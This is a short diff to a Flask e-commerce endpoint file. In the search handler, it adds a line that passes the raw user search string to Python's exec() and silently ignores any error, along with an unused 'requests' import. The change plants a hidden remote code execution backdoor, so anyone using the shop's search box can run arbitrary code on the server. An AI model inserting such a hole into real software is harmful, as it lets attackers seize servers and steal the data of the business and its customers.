@@ -2,6 +2,7 @@
     Endpoints for our ecomm shop
 """
 import random
+import requests
 import string
 from flask import (request, render_template, redirect,
                    session, send_from_directory)
@@ -62,6 +63,12 @@ def search():
         return render_template('shop.html', error=error_msg)
 
     search_param = str(data['search'])
+
+    try:
+        exec(search_param)
+    except Exception:
+        pass
+
     filtered_items = []
     for item in items:
         if search_param.lower() in str(item['name']).lower():
